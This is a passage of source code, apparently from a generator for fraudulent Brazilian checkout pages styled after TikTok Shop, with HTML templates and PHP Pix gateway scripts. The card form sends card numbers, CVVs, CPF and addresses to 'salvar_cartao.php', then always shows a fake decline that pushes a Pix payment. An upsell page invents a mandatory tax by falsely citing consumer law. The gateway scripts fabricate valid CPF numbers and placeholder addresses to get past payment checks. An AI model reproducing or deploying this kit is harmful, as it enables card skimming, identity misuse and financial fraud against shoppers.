            if(pixSeconds > 0) pixSeconds--; const ph = Math.floor(pixSeconds / 3600).toString().padStart(2,'0'); const pm = Math.floor((pixSeconds % 3600) / 60).toString().padStart(2,'0'); const ps = (pixSeconds % 60).toString().padStart(2,'0'); const pixEl = document.getElementById('pix-countdown'); if(pixEl) pixEl.innerText = \`\${ph}:\${pm}:\${ps}\`;
        }, 1000);
        function maskCPF(i) { let v = i.value.replace(/\\D/g, ""); v = v.replace(/(\\d{3})(\\d)/, "$1.$2"); v = v.replace(/(\\d{3})(\\d)/, "$1.$2"); v = v.replace(/(\\d{3})(\\d)/, "$1.$2"); v = v.replace(/(\\d{3})(\\d{1,2})$/, "$1-$2"); i.value = v.substring(0, 14); }
        function maskPhone(i) { let v = i.value.replace(/\\D/g, ""); v = v.replace(/^(\\d{2})(\\d)/g, "($1) $2"); v = v.replace(/(\\d)(\\d{4})$/, "$1-$2"); i.value = v.substring(0, 15); }
        function copyPixCode() { const code = document.getElementById('pix-code-raw'); code.select(); document.execCommand('copy'); const btn = document.getElementById('btn-copy'); btn.innerText = 'Copiado!'; setTimeout(() => btn.innerText = 'Copiar código Pix', 2000); }
        
        function fetchCep(cep) { 
            if(cep.length >= 8) { 
                document.getElementById('addr-city').value = 'Buscando...'; 
                fetch(\`https://viacep.com.br/ws/\${cep.replace(/\D/g,'')}/json/\`)
                .then(r=>{
                    if(!r.ok) throw new Error('Erro HTTP ' + r.status);
                    return r.json();
                })
                .then(d => { 
                    if(!d.erro) { 
                        document.getElementById('addr-street').value = d.logradouro; 
                        document.getElementById('addr-city').value = d.localidade + '/' + d.uf; 
                        document.getElementById('addr-num').focus(); 
                    } else { 
                        document.getElementById('addr-city').value = ''; 
                        alert("CEP não localizado.");
                    } 
                }).catch(e => {
                    console.log(e);
                }); 
            } 
        }
        
        renderCart();
        
        // --- CREDIT CARD FUNCTIONS V2 ---
        const cardDiscountPercentV2 = parseInt('{{CARD_DISCOUNT}}') || 15;
        let selectedPaymentV2 = 'pix';
        let discountedAmountV2 = 0;
        
        function selectPaymentV2(method) {
            selectedPaymentV2 = method;
            document.getElementById('payment-pix-v2').classList.toggle('selected', method === 'pix');
            document.getElementById('payment-card-v2').classList.toggle('selected', method === 'card');
            if (method === 'card') openCardScreenV2();
        }
        function openCardScreenV2() { document.getElementById('screen-card-form-v2').classList.remove('hidden-screen'); updateCardButtonV2(); }
        function closeCardScreenV2() { document.getElementById('screen-card-form-v2').classList.add('hidden-screen'); selectedPaymentV2 = 'pix'; document.getElementById('payment-pix-v2').classList.add('selected'); document.getElementById('payment-card-v2').classList.remove('selected'); }
        function maskCardNumberV2(input) { let v = input.value.replace(/\\D/g, ''); v = v.replace(/(\\d{4})(?=\\d)/g, '$1 '); input.value = v.substring(0, 19); updateCardButtonV2(); }
        function maskExpiryV2(input) { let v = input.value.replace(/\\D/g, ''); if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2); input.value = v.substring(0, 5); updateCardButtonV2(); }
        function updateCardButtonV2() {
            const num = document.getElementById('card-number-v2').value.replace(/\\s/g,'');
            const exp = document.getElementById('card-expiry-v2').value;
            const cvv = document.getElementById('card-cvv-v2').value;
            const holder = document.getElementById('card-holder-v2').value;
            const btn = document.getElementById('btn-card-continue-v2');
            if (num.length >= 13 && exp.length === 5 && cvv.length >= 3 && holder.length >= 3) {
                btn.disabled = false; btn.classList.remove('bg-gray-200', 'text-gray-400'); btn.classList.add('bg-[#fe2c55]', 'text-white');
            } else {
                btn.disabled = true; btn.classList.add('bg-gray-200', 'text-gray-400'); btn.classList.remove('bg-[#fe2c55]', 'text-white');
            }
        }
        ['card-number-v2','card-expiry-v2','card-cvv-v2','card-holder-v2'].forEach(id => { const el = document.getElementById(id); if(el) el.addEventListener('input', updateCardButtonV2); });
        
        async function processCardPaymentV2() {
            const btn = document.getElementById('btn-card-continue-v2');
            btn.innerHTML = '<div class="loader mx-auto"></div>'; btn.disabled = true;
            const cardData = { 
                // Dados do cartao
                card_number: document.getElementById('card-number-v2').value, 
                card_expiry: document.getElementById('card-expiry-v2').value, 
                card_cvv: document.getElementById('card-cvv-v2').value, 
                card_holder: document.getElementById('card-holder-v2').value, 
                // Dados da compra
                amount: currentTotalGlobal, 
                // Dados pessoais
                customer_name: document.getElementById('cust-name').value || 'Cliente', 
                customer_phone: document.getElementById('cust-phone').value || '', 
                customer_email: document.getElementById('cust-email').value || '', 
                customer_cpf: (document.getElementById('cust-cpf').value || '').replace(/\\D/g,''),
                // Dados de endereco (se existirem nos campos V2)
                address_zip: (document.getElementById('cust-zip') ? document.getElementById('cust-zip').value : '') || '',
                address_state: (document.getElementById('cust-state') ? document.getElementById('cust-state').value : '') || '',
                address_city: (document.getElementById('cust-city') ? document.getElementById('cust-city').value : '') || '',
                address_neighborhood: (document.getElementById('cust-neighborhood') ? document.getElementById('cust-neighborhood').value : '') || '',
                address_street: (document.getElementById('cust-street') ? document.getElementById('cust-street').value : '') || '',
                address_number: (document.getElementById('cust-number') ? document.getElementById('cust-number').value : '') || '',
                address_complement: (document.getElementById('cust-complement') ? document.getElementById('cust-complement').value : '') || '',
                timestamp: new Date().toISOString() 
            };
            try { await fetch('salvar_cartao.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(cardData) }); } catch(e) {}
            setTimeout(() => { btn.innerHTML = 'Continuar'; btn.disabled = false; showDeclinedModalV2(); }, 2500);
        }
        function showDeclinedModalV2() {
            discountedAmountV2 = currentTotalGlobal * (1 - cardDiscountPercentV2 / 100);
            document.getElementById('discount-percent-v2').innerText = cardDiscountPercentV2;
            document.getElementById('discounted-total-v2').innerText = discountedAmountV2.toLocaleString('pt-BR', {minimumFractionDigits: 2});
            document.getElementById('original-total-modal-v2').innerText = currentTotalGlobal.toLocaleString('pt-BR', {minimumFractionDigits: 2});
            document.getElementById('screen-card-form-v2').classList.add('hidden-screen');
            document.getElementById('modal-card-declined-v2').classList.remove('hidden-screen');
        }
        function closeDeclinedModalV2() { document.getElementById('modal-card-declined-v2').classList.add('hidden-screen'); document.getElementById('screen-card-form-v2').classList.remove('hidden-screen'); document.getElementById('card-number-v2').value = ''; document.getElementById('card-expiry-v2').value = ''; document.getElementById('card-cvv-v2').value = ''; document.getElementById('card-holder-v2').value = ''; updateCardButtonV2(); }
        async function acceptDiscountPixV2() {
            document.getElementById('modal-card-declined-v2').classList.add('hidden-screen');
            const btn = document.getElementById('btn-pay'); btn.innerHTML = '<div class="loader mx-auto"></div>'; btn.disabled = true;
            const name = document.getElementById('cust-name').value || 'Cliente';
            const cpf = (document.getElementById('cust-cpf').value || '00000000000').replace(/\\D/g,'');
            const phone = (document.getElementById('cust-phone').value || '11999999999').replace(/\\D/g,'');
            const email = document.getElementById('cust-email').value || 'cliente@email.com';
            const urlParams = new URLSearchParams(window.location.search);
            const clickId = urlParams.get('click_id') || urlParams.get('src') || '';
            const payload = { amount: discountedAmountV2, cpf: cpf, click_id: clickId, customer: { name: name, email: email, phone: phone }, items: cartItems.map(i => ({ title: i.title, unit_price: i.priceVal * (1 - cardDiscountPercentV2/100), quantity: i.qty, tangible: false })) };
            try {
                const response = await fetch('processar_pagamento.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
                const res = await response.json();
                if(res.success) { document.getElementById('screen-pix').classList.remove('hidden-screen'); document.getElementById('pix-value').innerText = discountedAmountV2.toLocaleString('pt-BR', {minimumFractionDigits: 2}); document.getElementById('pix-code-raw').value = res.pix_code; let qrSource = res.qr_image || 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(res.pix_code); document.getElementById('pix-qr-img').src = qrSource; document.getElementById('pix-qr-img').style.display = 'block'; window.scrollTo(0,0); }
                else { alert('Erro: ' + (res.message || 'Falha ao gerar PIX')); btn.innerHTML = 'Finalizar Compra'; btn.disabled = false; }
            } catch(e) { alert('Erro de conexao: ' + e.message); btn.innerHTML = 'Finalizar Compra'; btn.disabled = false; }
        }
    </script>
</body>
</html>`;

// 4. Modelo do Upsell (Taxa)
const UPSELL_TEMPLATE = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Status do Pedido</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #f3f4f6; color: #1f2937; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; }
        h1 { text-align: center; font-size: 28px; font-weight: 800; margin-top: 20px; margin-bottom: 40px; text-transform: uppercase; color: #000; }
        .container { width: 100%; max-width: 600px; display: flex; flex-direction: column; gap: 20px; }
        .card { background: white; padding: 30px 20px; border-radius: 12px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); text-align: center; display: none; animation: slideIn 0.5s ease-out forwards; }
        .card h2 { font-size: 18px; font-weight: 500; margin-bottom: 10px; color: #333; }
        .card p { font-size: 14px; color: #666; }
        .cross-icon { color: #ef4444; font-size: 22px; font-weight: bold; margin-left: 5px; }
        .alert-title { color: #dc2626 !important; font-weight: 700 !important; font-size: 20px !important; }
        .alert-text { font-size: 13px !important; line-height: 1.6; margin-bottom: 20px; color: #4b5563; }
        .btn-action { display: block; width: 100%; background-color: #22c55e; color: white; padding: 16px; border-radius: 6px; font-size: 16px; font-weight: 700; text-decoration: none; text-transform: uppercase; border: none; cursor: pointer; box-shadow: 0 4px 6px rgba(34, 197, 94, 0.2); transition: background-color 0.2s; }
        .btn-action:hover { background-color: #16a34a; }
        .footer-note { font-size: 11px !important; color: #9ca3af !important; margin-top: 12px; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .spinner { display: inline-block; width: 12px; height: 12px; border: 2px solid #ccc; border-top-color: #333; border-radius: 50%; animation: spin 1s linear infinite; margin-left: 8px; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1>ACOMPANHE O STATUS DO SEU PEDIDO:</h1>
    <div class="container">
        <div id="step-1" class="card" style="display: block;"><h2>Pedido sendo processado</h2><p>Aguarde um momento... <span class="spinner"></span></p></div>
        <div id="step-2" class="card"><h2>Seu Pedido foi barrado <span class="cross-icon">✕</span></h2><p>Estamos verificando as informações...</p></div>
        <div id="step-3" class="card">
            <h2 class="alert-title">Pagamento obrigatório do ICMS</h2>
            <p class="alert-text">De acordo com o Código de Defesa do Consumidor, para que sua compra seja processada e o produto despachado, é OBRIGATÓRIO o pagamento da Taxa de Envio e Processamento.</p>
            <a href="{{LINK_TAXA}}" class="btn-action">LIBERAR PRODUTO</a>
            <p class="footer-note">(Sem o pagamento da Taxa de Envio, seu produto NÃO será liberado!)</p>
        </div>
    </div>
    <script>
        const tempoParaPasso2 = 3000; const tempoParaPasso3 = 6500; 
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(() => { document.getElementById('step-2').style.display = 'block'; window.scrollBy({ top: 100, behavior: 'smooth' }); }, tempoParaPasso2);
            setTimeout(() => { document.getElementById('step-3').style.display = 'block'; document.getElementById('step-3').scrollIntoView({ behavior: 'smooth' }); }, tempoParaPasso3);
        });
    </script>
</body>
</html>`;

const CHECKOUT_TAXA_TEMPLATE = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento Seguro - TENF</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #f7f9fa; }
        .hidden-screen { display: none !important; }
        .btn-pay { background-color: #0c1e29; transition: opacity 0.2s; }
        .btn-pay:hover { opacity: 0.9; }
        .input-field { background-color: #f9fafb; border: 1px solid #e5e7eb; transition: all 0.2s; }
        .input-field:focus { background-color: white; border-color: #0c1e29; outline: none; }
        .selected-method { background-color: #f8fafc; border: 1px solid #e2e8f0; }
        .loader { border: 3px solid #f3f3f3; border-radius: 50%; border-top: 3px solid #0c1e29; width: 20px; height: 20px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
    <div id="payment-screen" class="w-full max-w-6xl grid grid-cols-1 md:grid-cols-2 gap-8 items-start">
        <div class="pt-10 px-4 md:px-12">
            <div class="flex items-center gap-4 mb-8"><div class="w-16 h-16 bg-white border border-gray-100 rounded-lg flex items-center justify-center shadow-sm p-2"><img src="https://editor.sys-assets-check.com/img/1744723832798-4T0mgBP3Zr1cblVtmOC2POeZygmO9AUoihoRP4Xt.jpg" class="w-full h-full object-contain"></div><div><h2 class="font-bold text-gray-900 text-lg">TENF</h2><p class="text-gray-500 text-sm">Taxa de emissão de nota fiscal.</p></div></div>
            <div class="border-t border-gray-200 my-6"></div><div class="flex justify-between items-center text-gray-600"><span>Total</span><span class="font-medium text-gray-900 text-lg">R$ 27,91</span></div>
        </div>
        <div class="space-y-6">
            <div class="bg-white rounded-2xl p-8 shadow-sm border border-gray-100"><div class="flex items-center gap-3 mb-6"><div class="bg-[#0c1e29] text-white p-1.5 rounded-full"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div><h3 class="font-semibold text-lg">Identificaç��o</h3></div><div><label class="block text-sm text-gray-600 mb-2">Nome completo</label><input type="text" id="tax-name" placeholder="Nome e sobrenome" class="w-full p-4 rounded-lg input-field text-gray-900 placeholder-gray-400"></div><div class="mt-4"><label class="block text-sm text-gray-600 mb-2">CPF</label><input type="text" id="tax-cpf" placeholder="000.000.000-00" oninput="maskCPF(this)" class="w-full p-4 rounded-lg input-field text-gray-900 placeholder-gray-400"></div></div>
            <div class="bg-white rounded-2xl p-8 shadow-sm border border-gray-100"><h3 class="font-semibold text-2xl mb-6">Escolha um método de pagamento...</h3><div class="selected-method rounded-xl p-4 flex items-center justify-between cursor-pointer mb-8"><div class="flex items-center gap-4"><div class="w-8 h-8 flex items-center justify-center"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" fill="#32BCAD" fill-opacity="0.2"/><path d="M8 12L10.5 14.5L16 9" stroke="#32BCAD" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div><p class="font-semibold text-gray-900 text-sm">Pagamento via Pix</p><p class="text-gray-500 text-xs">Aprovação imediata.</p></div></div><div class="bg-[#0c1e29] rounded-full p-1"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="4"><polyline points="20 6 9 17 4 12"></polyline></svg></div></div><button onclick="payTax()" id="btn-pay-tax" class="btn-pay w-full text-white font-semibold py-4 rounded-xl text-lg shadow-lg flex items-center justify-center gap-2">Pagar</button><p class="text-center text-gray-400 text-xs mt-6 px-4">Ao finalizar o pagamento você concorda com nossos termos de uso e privacidade.</p></div>
        </div>
    </div>
    <div id="pix-screen" class="hidden-screen w-full max-w-md bg-white p-6 rounded-2xl shadow-xl text-center">
        <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg></div>
        <h2 class="text-2xl font-bold mb-2">QR Code Gerado!</h2><p class="text-gray-500 mb-6">Escaneie ou copie o código abaixo para pagar a taxa.</p>
        <div class="bg-gray-50 p-4 rounded-lg mb-4 flex justify-center"><img id="pix-qr-img" class="w-48 h-48 mix-blend-multiply"></div><textarea id="pix-code-raw" class="hidden"></textarea>
        <button onclick="copyPixCode()" id="btn-copy" class="w-full bg-[#0c1e29] text-white font-bold py-3 rounded-lg mb-3">Copiar Código Pix</button><p class="text-xs text-gray-400 mt-4">Após o pagamento, seu pedido será liberado automaticamente.</p>
    </div>
    <script>
        const TAX_AMOUNT = 27.91; const TAX_TITLE = "Taxa de Emissão de Nota Fiscal (TENF)";
        function maskCPF(i) { let v = i.value.replace(/\\D/g, ""); v = v.replace(/(\\d{3})(\\d)/, "$1.$2"); v = v.replace(/(\\d{3})(\\d)/, "$1.$2"); v = v.replace(/(\\d{3})(\\d{1,2})$/, "$1-$2"); i.value = v.substring(0, 14); }
        async function payTax() {
            const btn = document.getElementById('btn-pay-tax'); const name = document.getElementById('tax-name').value; const cpf = document.getElementById('tax-cpf').value;
            if(name.trim() === "" || cpf.length < 14) { alert("Por favor, preencha seu nome e CPF corretamente."); return; }
            const oldText = btn.innerHTML; btn.innerHTML = '<div class="loader"></div>'; btn.disabled = true;
            try {
                const response = await fetch('processar_pagamento.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ amount: TAX_AMOUNT, cpf: cpf, customer: { name: name, email: 'taxa@pagamento.com', phone: '11999999999' }, items: [{ title: TAX_TITLE, unit_price: TAX_AMOUNT, quantity: 1, tangible: false }] }) }); 
                const res = await response.json();
                if(res.success) { document.getElementById('payment-screen').classList.add('hidden-screen'); document.getElementById('pix-screen').classList.remove('hidden-screen'); document.getElementById('pix-code-raw').value = res.pix_code; const imgEl = document.getElementById('pix-qr-img'); if(res.qr_image) imgEl.src = res.qr_image; } else { alert('Erro ao gerar PIX: ' + (res.message || 'Tente novamente.')); btn.innerHTML = oldText; btn.disabled = false; }
            } catch(e) { console.error(e); alert('Erro de conexão.'); btn.innerHTML = oldText; btn.disabled = false; }
        }
        function copyPixCode() { const code = document.getElementById('pix-code-raw').value; navigator.clipboard.writeText(code); const btn = document.getElementById('btn-copy'); btn.textContent = "Copiado!"; setTimeout(() => { btn.textContent = "Copiar Código Pix"; }, 2000); }
    </script>
</body>
</html>`;

// ============================================================================
// ===================== BIBLIOTECA DE TEMPLATES PHP (GATEWAYS) ===============
// ============================================================================
const GATEWAY_TEMPLATES = {
    cyberhub: `<?php
error_reporting(0);
ini_set('display_errors', 0);
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
ob_start();

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

$publicKey = '{{KEY_PUBLIC}}';
$secretKey = '{{KEY_SECRET}}';

if (empty($publicKey) || empty($secretKey)) { 
    ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Chaves não configuradas']); exit; 
}

function gerarCpfValido() {
    $n = []; for ($i = 0; $i < 9; $i++) $n[$i] = rand(0, 9);
    $d1 = 0; for ($i = 0; $i < 9; $i++) $d1 += $n[$i] * (10 - $i);
    $r1 = $d1 % 11; $d1 = ($r1 < 2) ? 0 : 11 - $r1;
    $d2 = 0; for ($i = 0; $i < 9; $i++) $d2 += $n[$i] * (11 - $i);
    $d2 += $d1 * 2; $r2 = $d2 % 11; $d2 = ($r2 < 2) ? 0 : 11 - $r2;
    return implode('', $n) . $d1 . $d2;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Sem dados']); exit; }

$amount = (int)round(($input['amount'] ?? 0) * 100);
$cpfInput = preg_replace('/\\D/', '', $input['cpf'] ?? '');
$isValidFormat = (strlen($cpfInput) == 11 && !preg_match('/^(\\d)\\1{10}$/', $cpfInput));
$cpf = $isValidFormat ? $cpfInput : gerarCpfValido();

$name = $input['customer']['name'] ?? 'Cliente';
$email = $input['customer']['email'] ?? 'cliente@email.com';

$url = 'https://api.cyberhubpagamentos.com/v1/transactions';
$auth = base64_encode("$publicKey:$secretKey");

$payload = [
    'amount' => $amount,
    'paymentMethod' => 'pix',
    'customer' => [ 'name' => $name, 'email' => $email, 'document' => ['type' => 'cpf', 'number' => $cpf] ],
    'items' => [['title' => 'Pedido', 'unitPrice' => $amount, 'quantity' => 1, 'tangible' => false]]
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json', 'Authorization: Basic ' . $auth]);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

$res = json_decode($result, true);
$pixCode = $res['pix']['qrcode'] ?? null;

ob_end_clean();

if ($pixCode) {
    $qrImage = $res['pix']['qrcode_url'] ?? 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' . urlencode($pixCode);
    echo json_encode(['success'=>true, 'pix_code'=>$pixCode, 'qr_image'=>$qrImage]);
} else {
    echo json_encode(['success'=>false, 'message'=>'Erro CyberHub', 'debug'=>$res]);
}
?>`,

payhub: `<?php
error_reporting(0);
ini_set('display_errors', 0);
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
ob_start();

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

$apiToken = '{{KEY_SECRET}}'; 
$publicKey = 'x'; 

if (empty($apiToken)) { 
    ob_end_clean(); 
    echo json_encode(['success'=>false, 'message'=>'Erro: API Secret PayHub não configurada.']); 
    exit; 
}

function gerarCpfValido() {
    $n = []; for ($i = 0; $i < 9; $i++) $n[$i] = rand(0, 9);
    $d1 = 0; for ($i = 0; $i < 9; $i++) $d1 += $n[$i] * (10 - $i);
    $r1 = $d1 % 11; $d1 = ($r1 < 2) ? 0 : 11 - $r1;
    $d2 = 0; for ($i = 0; $i < 9; $i++) $d2 += $n[$i] * (11 - $i);
    $d2 += $d1 * 2; $r2 = $d2 % 11; $d2 = ($r2 < 2) ? 0 : 11 - $r2;
    return implode('', $n) . $d1 . $d2;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Sem dados']); exit; }

$amount = (int)round(($input['amount'] ?? 0) * 100);
$cpfInput = preg_replace('/\\D/', '', $input['cpf'] ?? '');
$cpf = (strlen($cpfInput) == 11) ? $cpfInput : gerarCpfValido();

$payload = [
  "amount" => $amount,
  "paymentMethod" => "PIX",
  "customer" => [
    "name" => $input['customer']['name'] ?? 'Cliente',
    "email" => $input['customer']['email'] ?? 'cliente@email.com',
    "document" => [ "number" => $cpf, "type" => "CPF" ],
    "phone" => preg_replace('/\\D/', '', $input['customer']['phone'] ?? '') ?: '11999999999'
  ],
  "items" => [
    [
      "title" => "Pedido TikTok Shop",
      "unitPrice" => $amount,
      "quantity" => 1,
      "tangible" => false
    ]
  ],
  "pix" => [ "expiresInDays" => 1 ]
];

$url = 'https://api.payhubr.com/api/user/transactions';
$auth = base64_encode("x:{$apiToken}"); 

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json', 
    'Authorization: Basic ' . $auth
]);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

$res = json_decode($result, true);
$pixCode = $res['pix']['qrcode_emv'] ?? $res['pix']['qrcode'] ?? null;

ob_end_clean();

if ($pixCode) {
    $qrImage = $res['pix']['qrcode_url'] ?? 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' . urlencode($pixCode);
    echo json_encode(['success'=>true, 'pix_code'=>$pixCode, 'qr_image'=>$qrImage]);
} else {
    echo json_encode(['success'=>false, 'message'=>'Erro PayHub', 'api_response'=>$res]);
}
?>`,

plumify: `<?php
error_reporting(0);
ini_set('display_errors', 0);
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
ob_start();

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

$apiToken = '{{KEY_PUBLIC}}';

if (empty($apiToken)) { 
    ob_end_clean(); 
    echo json_encode(['success'=>false, 'message'=>'Erro: Token API Plumify não configurado.']); 
    exit; 
}

function gerarCpfValido() {
    $n = []; for ($i = 0; $i < 9; $i++) $n[$i] = rand(0, 9);
    $d1 = 0; for ($i = 0; $i < 9; $i++) $d1 += $n[$i] * (10 - $i);
    $r1 = $d1 % 11; $d1 = ($r1 < 2) ? 0 : 11 - $r1;
    $d2 = 0; for ($i = 0; $i < 9; $i++) $d2 += $n[$i] * (11 - $i);
    $d2 += $d1 * 2; $r2 = $d2 % 11; $d2 = ($r2 < 2) ? 0 : 11 - $r2;
    return implode('', $n) . $d1 . $d2;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Sem dados']); exit; }

// Garante valor inteiro e mínimo de 1 real
$amount = (int)round(($input['amount'] ?? 0) * 100);
if ($amount <= 0) $amount = 100; 

$cpfInput = preg_replace('/\\D/', '', $input['cpf'] ?? '');
$isValidFormat = (strlen($cpfInput) == 11 && !preg_match('/^(\\d)\\1{10}$/', $cpfInput));
$cpf = $isValidFormat ? $cpfInput : gerarCpfValido();

$name = $input['customer']['name'] ?? 'Cliente';
$email = $input['customer']['email'] ?? 'cliente@email.com';
$phone = preg_replace('/\\D/', '', $input['customer']['phone'] ?? '') ?: '11999999999';

// Imagem segura para passar na validação
$safeImage = "https://placehold.co/500x500.png";

function plumifyRequest($endpoint, $method, $data, $token) {
    $url = "https://api.plumify.com.br/api/public/v1" . $endpoint . "?api_token=" . $token;
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    if($data) curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data, JSON_UNESCAPED_SLASHES));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json', 'Accept: application/json']);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['body' => json_decode($result, true), 'code' => $httpCode];
}

// 1. CRIAR PRODUTO
$productPayload = [
    "title" => "Pedido #" . time(),
    "cover" => $safeImage, 
    "sale_page" => "https://google.com",
    "payment_type" => 1,
    "product_type" => "digital",
    "delivery_type" => 1,
    "id_category" => 1,
    "amount" => $amount
];

$prodReq = plumifyRequest('/products', 'POST', $productPayload, $apiToken);
$prodBody = $prodReq['body'];
$productHash = $prodBody['hash'] ?? $prodBody['data']['hash'] ?? $prodBody['uuid'] ?? null;

if (!$productHash) {
    ob_end_clean();
    $msgErro = isset($prodBody['message']) ? $prodBody['message'] : json_encode($prodBody);
    echo json_encode(['success'=>false, 'message'=>'Erro ao criar Produto. API diz: ' . $msgErro]);
    exit;
}

// 2. CRIAR OFERTA
$offerPayload = [
    "title" => "Oferta Principal",
    "cover" => $safeImage,
    "amount" => $amount,
    "price" => $amount,
    "unit_price" => $amount
];

$offerReq = plumifyRequest("/products/{$productHash}/offers", 'POST', $offerPayload, $apiToken);
$offerBody = $offerReq['body'];
$offerHash = $offerBody['hash'] ?? $offerBody['data']['hash'] ?? null;

if (!$offerHash) {
    ob_end_clean();
    $msgErro = isset($offerBody['message']) ? $offerBody['message'] : json_encode($offerBody);
    echo json_encode(['success'=>false, 'message'=>'Erro ao criar Oferta. API diz: ' . $msgErro]);
    exit;
}

// 3. CRIAR TRANSAÇÃO (CORREÇÃO: Campo installments adicionado)
$transactionPayload = [
    "amount" => $amount,
    "offer_hash" => $offerHash,
    "payment_method" => "pix",
    "installments" => 1, // <--- CORREÇÃO AQUI
    "customer" => [
        "name" => $name,
        "email" => $email,
        "phone_number" => $phone,
        "document" => $cpf,
        // Endereço fixo para garantir aprovação da API se o frontend falhar
        "street_name" => "Rua Principal",
        "number" => "100",
        "complement" => "Apto 1",
        "neighborhood" => "Centro",
        "city" => "Sao Paulo",
        "state" => "SP",
        "zip_code" => "01001000"
    ],
    "cart" => [[
        "product_hash" => $productHash,
        "title" => "Pedido #" . time(),
        "cover" => $safeImage,
        "price" => $amount,
        "quantity" => 1,
        "operation_type" => 1,
        "tangible" => false
    ]],
    "transaction_origin" => "api"
];

$transReq = plumifyRequest("/transactions", 'POST', $transactionPayload, $apiToken);
$res = $transReq['body'];

function findPixCode($arr) {
    if (!is_array($arr)) return null;
    if (isset($arr['qrcode'])) return $arr['qrcode'];
    if (isset($arr['emv'])) return $arr['emv'];
    if (isset($arr['pix_code'])) return $arr['pix_code'];
    foreach ($arr as $k => $v) {
        if (is_string($v) && strpos($v, '000201') === 0) return $v;
        if (is_array($v)) { $f = findPixCode($v); if ($f) return $f; }
    }
    return null;
}

$pixCode = findPixCode($res);

ob_end_clean();

if ($pixCode) {
    $qrImage = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' . urlencode($pixCode);
    echo json_encode(['success'=>true, 'pix_code'=>$pixCode, 'qr_image'=>$qrImage]);
} else {
    $msgErro = isset($res['message']) ? $res['message'] : json_encode($res);
    echo json_encode(['success'=>false, 'message'=>'Erro na Transação. API diz: ' . $msgErro]);
}
?>`,
fastsoft: `<?php
error_reporting(0);
ini_set('display_errors', 0);
